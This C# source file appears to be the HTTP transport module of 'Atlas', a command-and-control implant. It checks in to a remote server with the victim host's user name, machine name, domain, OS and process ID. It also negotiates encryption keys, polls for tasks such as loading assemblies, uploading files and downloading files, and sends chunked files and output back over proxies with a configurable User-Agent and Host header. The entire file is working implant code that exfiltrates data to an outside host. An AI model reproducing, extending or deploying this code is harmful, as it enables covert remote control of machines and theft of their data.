using System;
using System.Net;
using System.Linq;
#if DEFAULT
using System.Text;
#endif
using System.Collections.Generic;
using System.Diagnostics;
using Microsoft.Win32;

namespace Atlas
{
    public class Http
    {
        public static bool CheckIn()
        {
            try
            {
#if DEFAULT_EKE
                Crypto.GenRsaKeys();
                Utils.GetStage GetStage = new Utils.GetStage
                {
                    action = "staging_rsa",
                    pub_key = Crypto.GetPubKey(),
                    session_id = Utils.GetSessionId()

                };
                Config.SessionId = GetStage.session_id;
                string SerializedData = Crypto.EncryptStage(Utils.GetStage.ToJson(GetStage));
                var result = Get(SerializedData);
                string final_result = Crypto.Decrypt(result);
                Utils.StageResponse StageResponse = Utils.StageResponse.FromJson(final_result);
                Config.tempUUID = StageResponse.uuid;
                Config.Psk = Convert.ToBase64String(Crypto.RsaDecrypt(Convert.FromBase64String(StageResponse.session_key)));
#endif
                Utils.CheckIn CheckIn = new Utils.CheckIn
                {
                    action = "checkin",
                    ip = Utils.GetIPAddress(),
                    os = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName", "").ToString() + " " + Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ReleaseId", ""),
                    user = Environment.UserName.ToString(),
                    host = Environment.MachineName.ToString(),
                    domain = Environment.UserDomainName.ToString(),
                    pid = Process.GetCurrentProcess().Id,
                    uuid = Config.PayloadUUID,
                    architecture = Utils.GetArch()
                };
#if DEFAULT
                string FinalSerializedData = Convert.ToBase64String(Encoding.UTF8.GetBytes(Config.PayloadUUID + Utils.CheckIn.ToJson(CheckIn)));
#elif (DEFAULT_PSK || DEFAULT_EKE)
                string FinalSerializedData = Crypto.EncryptCheckin(Utils.CheckIn.ToJson(CheckIn));
#endif
                var new_result = Get(FinalSerializedData);
#if (DEFAULT_PSK || DEFAULT_EKE)
                string last_result = Crypto.Decrypt(new_result);
#endif
#if DEFAULT
                Utils.CheckInResponse CheckInResponse = Utils.CheckInResponse.FromJson(Encoding.UTF8.GetString(Convert.FromBase64String(new_result)).Substring(36));
#elif (DEFAULT_PSK || DEFAULT_EKE)
                Utils.CheckInResponse CheckInResponse = Utils.CheckInResponse.FromJson(last_result);
#endif
                Config.UUID = CheckInResponse.id;
                if (CheckInResponse.status == "success")
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
            catch
            {
                return false;
            }
        }

        public static bool GetTasking(Utils.JobList JobList)
        {
            try
            {
                foreach (Utils.Job Job in JobList.jobs)
                {
                    if (Job.upload)
                    {
                        if ((Job.total_chunks != Job.chunk_num) & (Job.total_chunks != 0))
                        {
                            if (!Job.chunking_started)
                            {
                                Utils.UploadTasking UploadTasking = Utils.UploadTasking.FromJson(Job.parameters);
                                Job.file_id = UploadTasking.assembly_id;
                                Job.path = UploadTasking.remote_path;
                                Utils.Upload Upload = new Utils.Upload
                                {
                                    action = "upload",
                                    chunk_size = Config.ChunkSize,
                                    file_id = Job.file_id,
                                    chunk_num = Job.chunk_num,
                                    full_path = Job.path,
                                    task_id = Job.task_id
                                };
                                Utils.UploadResponse UploadResponse = Http.GetUpload(Upload);
                                Job.total_chunks = UploadResponse.total_chunks;
                                Job.chunks.Add(UploadResponse.chunk_data);
                                Job.chunking_started = true;
                            }
                            else
                            {
                                Job.chunk_num++;
                                Utils.Upload ChunkUpload = new Utils.Upload
                                {
                                    action = "upload",
                                    chunk_size = Config.ChunkSize,
                                    file_id = Job.file_id,
                                    chunk_num = Job.chunk_num,
                                    full_path = Job.path,
                                    task_id = Job.task_id
                                };
                                Utils.UploadResponse UploadResponse = Http.GetUpload(ChunkUpload);
                                Job.chunks.Add(UploadResponse.chunk_data);
                            }
                        }
                    }
                }
                Utils.GetTasking GetTasking = new Utils.GetTasking
                {
                    action = "get_tasking",
                    tasking_size = -1
                };
#if DEFAULT
                string SerializedData = Convert.ToBase64String(Encoding.UTF8.GetBytes(Config.UUID + Utils.GetTasking.ToJson(GetTasking)));
#elif (DEFAULT_PSK || DEFAULT_EKE)
                string SerializedData = Crypto.Encrypt(Utils.GetTasking.ToJson(GetTasking));
#endif
                var result = Get(SerializedData);
#if DEFAULT
                string final_result = Encoding.UTF8.GetString(Convert.FromBase64String(result));
#elif (DEFAULT_PSK || DEFAULT_EKE)
                string final_result = Crypto.Decrypt(result);
#endif
                if (final_result.Substring(0, 36) != Config.UUID)
                {
                    return false;
                }
                Utils.GetTaskingResponse GetTaskResponse = Utils.GetTaskingResponse.FromJson(final_result.Substring(36));
                if (GetTaskResponse.tasks[0].command == "")
                {
                    return false;
                }
                foreach (Utils.Task task in GetTaskResponse.tasks) {
                    Utils.Job Job = new Utils.Job
                    {
                        job_id = JobList.job_count,
                        task_id = task.id,
                        completed = false,
                        job_started = false,
                        success = false,
                        command = task.command,
                        parameters = task.parameters,
                        total_chunks = 0
                    };
                    if (Job.command == "loadassembly" || Job.command == "upload")
                    {
                        Job.upload = true;
                        Job.total_chunks = 2;
                        Job.chunk_num = 1;
                    }
                    else if (Job.command == "download")
                    {
                        Job.download = true;
                    }
                    else if (Job.command == "jobs")
                    {
                        Job.response = Modules.GetJobs(JobList);
                        Job.completed = true;
                        Job.success = true;
                    }
                    else if (Job.command == "jobkill")
                    {
                        if (Modules.KillJob(JobList, Int32.Parse(Job.parameters)))
                        {
                            Job.completed = true;
                            Job.success = true;
                            Job.response = "Job successfully removed";
                        }
                        else
                        {
                            Job.completed = true;
                            Job.success = false;
                            Job.response = "Could not remove job";
                        }
                    }
                    JobList.jobs.Add(Job);
                    ++JobList.job_count;
                }
                return true;
            }
            catch
            {
                return false;
            }
        }

        public static Utils.UploadResponse GetUpload(Utils.Upload Upload)
        {
            try
            {
#if DEFAULT
                string SerializedData = Convert.ToBase64String(Encoding.UTF8.GetBytes(Config.UUID + Utils.Upload.ToJson(Upload)));
#elif (DEFAULT_PSK || DEFAULT_EKE)
                string SerializedData = Crypto.Encrypt(Utils.Upload.ToJson(Upload));
#endif
                var result = Get(SerializedData);
#if DEFAULT
                string final_result = Encoding.UTF8.GetString(Convert.FromBase64String(result));
#elif (DEFAULT_PSK || DEFAULT_EKE)
                string final_result = Crypto.Decrypt(result);
#endif
                Utils.UploadResponse UploadResponse = Utils.UploadResponse.FromJson(final_result.Substring(36));

                return UploadResponse;
            }
            catch
            {
                Utils.UploadResponse UploadResponse = new Utils.UploadResponse { };
                return UploadResponse;
            }
        }

        public static bool PostResponse(Utils.JobList JobList)
        {
            try
            {
                Utils.PostResponse PostResponse = new Utils.PostResponse
                {
                    action = "post_response",
                    responses = { }
                };
                foreach (Utils.Job Job in JobList.jobs)
                {
                    if (Job.completed)
                    {
                         if (!Job.success)
                        {
                            Utils.TaskResponse TaskResponse = new Utils.TaskResponse
                            {
                                task_id = Job.task_id,
                                user_output = Job.response,
                                status = "error",
                                completed = "false",
                                total_chunks = null,
                                full_path = null,
                                chunk_num = null,
                                chunk_data = null,
                                file_id = null
                            };
                            PostResponse.responses.Add(TaskResponse);
                        }
                        else if (Job.download)
                        {
                            if (Job.file_id == null)
                            {
                                Utils.TaskResponse TaskResponse = new Utils.TaskResponse
                                {
                                    task_id = Job.task_id,
                                    user_output = null,
                                    status = null,
                                    completed = null,
                                    total_chunks = Job.total_chunks,
                                    full_path = Job.path,
                                    chunk_num = null,
                                    chunk_data = null,
                                    file_id = null
                                };
                                PostResponse.responses.Add(TaskResponse);
                            }
                            else if (Job.chunk_num == Job.total_chunks)
                            {
                                Utils.TaskResponse TaskResponse = new Utils.TaskResponse
                                {
                                    task_id = Job.task_id,
                                    user_output = null,
                                    status = null,
                                    completed = "true",
                                    total_chunks = null,
                                    full_path = null,
                                    chunk_num = Job.chunk_num,
                                    chunk_data = Job.chunks[0],
                                    file_id = Job.file_id
                                };
                                PostResponse.responses.Add(TaskResponse);
                            }
                            else
                            {
                                Utils.TaskResponse TaskResponse = new Utils.TaskResponse
                                {
                                    task_id = Job.task_id,
                                    user_output = null,
                                    status = null,
                                    completed = null,
                                    total_chunks = null,
                                    full_path = null,
                                    chunk_num = Job.chunk_num,
                                    chunk_data = Job.chunks[0],
                                    file_id = Job.file_id
                                };
                                PostResponse.responses.Add(TaskResponse);
                            }
                        }
                        else if ((Job.total_chunks != 0) && (!Job.upload))
                        {
                            if (Job.chunk_num != Job.total_chunks)
                            {
                                Utils.TaskResponse TaskResponse = new Utils.TaskResponse
                                {
                                    task_id = Job.task_id,
                                    user_output = Job.chunks[0],
                                    completed = "false",
                                    total_chunks = null,
                                    full_path = null,
                                    chunk_num = null,
                                    chunk_data = null,
                                    file_id = null
                                };
                                PostResponse.responses.Add(TaskResponse);
                            }
                            else
                            {
                                Utils.TaskResponse TaskResponse = new Utils.TaskResponse
                                {
                                    task_id = Job.task_id,
                                    user_output = Job.chunks[0],
                                    completed = "true",
                                    total_chunks = null,
                                    full_path = null,
                                    chunk_num = null,
                                    chunk_data = null,
                                    file_id = null
                                };
                                PostResponse.responses.Add(TaskResponse);
                            }
                        }
                        else
                        {
                            Utils.TaskResponse TaskResponse = new Utils.TaskResponse
                            {
                                task_id = Job.task_id,
                                user_output = Job.response,
                                completed = "true",
                                total_chunks = null,
                                full_path = null,
                                chunk_num = null,
                                chunk_data = null,
                                file_id = null
                            };
                            PostResponse.responses.Add(TaskResponse);
                        }
                    }
                }
                if (PostResponse.responses.Count < 1)
                {
                    return false;
                }
                string Data = Utils.PostResponse.ToJson(PostResponse);
#if DEFAULT
                string SerializedData = Convert.ToBase64String(Encoding.UTF8.GetBytes(Config.UUID + Utils.PostResponse.ToJson(PostResponse)));
#elif (DEFAULT_PSK || DEFAULT_EKE)
                string SerializedData = Crypto.Encrypt(Utils.PostResponse.ToJson(PostResponse));
#endif
                string result = Post(SerializedData);
#if DEFAULT
                string final_result = Encoding.UTF8.GetString(Convert.FromBase64String(result));
#elif (DEFAULT_PSK || DEFAULT_EKE)
                string final_result = Crypto.Decrypt(result);
#endif
                Utils.PostResponseResponse PostResponseResponse = Utils.PostResponseResponse.FromJson(final_result.Substring(36));
                List<Utils.Job> TempList = new List<Utils.Job>(JobList.jobs);
                foreach (Utils.Response Response in PostResponseResponse.responses)
                {
                    foreach (Utils.Job Job in TempList)
                    {
                        if (Job.completed)
                        {
                            if (Job.task_id == Response.task_id)
                            {
                                if (Response.status == "success")
                                {
                                    if (Job.download)
                                    {
                                        if (Job.file_id == null)
                                        {
                                            Job.file_id = Response.file_id;
                                        }
                                        if (Job.total_chunks == Job.chunk_num)
                                        {
                                            Utils.RemoveJob(Job, JobList);
                                        }
                                        else
                                        {
                                            if (Job.chunks.Count != 0)
                                            {
                                                Job.completed = true;
                                                Job.chunks.RemoveAt(0);
                                            }
                                        }
                                    }
                                    else if ((Job.total_chunks != 0) & (!Job.upload))
                                    {
                                        if (Job.chunk_num + 1 != Job.total_chunks)
                                        {
                                            Job.chunks.RemoveAt(0);
                                            Job.chunk_num++;
                                        }
                                        else
                                        {
                                            Utils.RemoveJob(Job, JobList);
                                        }
                                    }
                                    else
                                    {
                                        Utils.RemoveJob(Job, JobList);
                                    }
                                }
                            }
                        }
                    }
                }
                TempList = null;
                return true;
            }
            catch
            {
                return false;
            }
        }
        public static string Get(string B64Data)
        {
            string result = null;
            WebClient client = new System.Net.WebClient();
            if (Config.DefaultProxy)
            {
                client.Proxy = WebRequest.DefaultWebProxy;
                client.UseDefaultCredentials = true;
                client.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
            }
            else
            {
                WebProxy proxy = new WebProxy
                {
                    Address = new Uri(Config.ProxyAddress),
                    UseDefaultCredentials = false,
                    Credentials = new NetworkCredential(Config.ProxyUser, Config.ProxyPassword)
                };
                client.Proxy = proxy;
            }
            client.Headers.Add("User-Agent", Config.UserAgent);
#if NET_4
            if (Config.HostHeader != "")
            {
                client.Headers.Add("Host", Config.HostHeader);
            }
#endif
            client.QueryString.Add(Config.Param, B64Data.Replace("+", "%2B").Replace("/", "%2F").Replace("=", "%3D").Replace("\n", "%0A"));
            Config.Servers = Config.Servers.OrderBy(s=>s.count).ToList();
            try
            {
                result = client.DownloadString(Config.Servers[0].domain + Config.GetUrl);
                return result;
            }
            catch
            {
                Config.Servers[0].count++;
                return result;
            }
        }

        public static string Post(string B64Data)
        {
            string result = null;
            WebClient client = new System.Net.WebClient();
            if (Config.DefaultProxy)
            {
                client.Proxy = WebRequest.DefaultWebProxy;
                client.UseDefaultCredentials = true;
                client.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
            }
            else
            {
                WebProxy proxy = new WebProxy
                {
                    Address = new Uri(Config.ProxyAddress),
                    UseDefaultCredentials = false,
                    Credentials = new NetworkCredential(Config.ProxyUser, Config.ProxyPassword)
                };
                client.Proxy = proxy;
            }
            client.Headers.Add("User-Agent", Config.UserAgent);
#if NET_4
            if (Config.HostHeader != "")
            {
                client.Headers.Add("Host", Config.HostHeader);
            }
#endif
            Config.Servers = Config.Servers.OrderBy(s => s.count).ToList();
            try
            {
                result = client.UploadString(Config.Servers[0].domain + Config.PostUrl, B64Data);
                return result;
            }
            catch
            {
                Config.Servers[0].count++;
                return result;
            }
        }
    }
}